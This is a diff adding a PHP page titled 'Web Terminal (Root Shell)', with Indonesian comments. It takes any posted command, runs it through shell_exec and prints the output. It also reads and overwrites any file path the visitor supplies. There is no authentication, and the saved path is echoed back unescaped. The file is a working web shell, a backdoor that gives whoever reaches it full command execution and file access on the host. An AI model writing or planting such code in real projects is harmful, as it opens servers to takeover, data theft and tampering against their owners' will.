@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web Terminal</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        input, button, textarea { background: #111; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+        .output { white-space: pre; margin-top: 10px; }
+        .editor { margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>Web Terminal (Root Shell)</h2>
+
+    <form method="post">
+        <label>$ </label>
+        <input type="text" name="cmd" autofocus style="width: 70%;" />
+        <button type="submit">Run</button>
+        <button type="submit" name="edit" value="1">Edit</button>
+    </form>
+
+    <div class="output">
+        <?php
+        if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST['cmd'])) {
+            $cmd = $_POST['cmd'];
+            if (isset($_POST['edit'])) {
+                if (file_exists($cmd)) {
+                    $content = htmlspecialchars(file_get_contents($cmd));
+                    echo "<form method='post' class='editor'>";
+                    echo "<input type='hidden' name='filepath' value='".htmlspecialchars($cmd)."' />";
+                    echo "<textarea name='filecontent' rows='20' cols='100'>$content</textarea><br>";
+                    echo "<button type='submit' name='save' value='1'>Save File</button>";
+                    echo "</form>";
+                } else {
+                    echo htmlspecialchars("File not found: $cmd");
+                }
+            } else {
+                // Jalankan perintah shell
+                $output = shell_exec($cmd . ' 2>&1');
+                echo htmlspecialchars("$cmd\n$output");
+            }
+        }
+
+        // Simpan file dari editor
+        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['save']) && !empty($_POST['filepath'])) {
+            $path = $_POST['filepath'];
+            $content = $_POST['filecontent'];
+            file_put_contents($path, $content);
+            echo "<br><strong>File saved:</strong> $path";
+        }
+        ?>
+    </div>
+</body>
+</html>
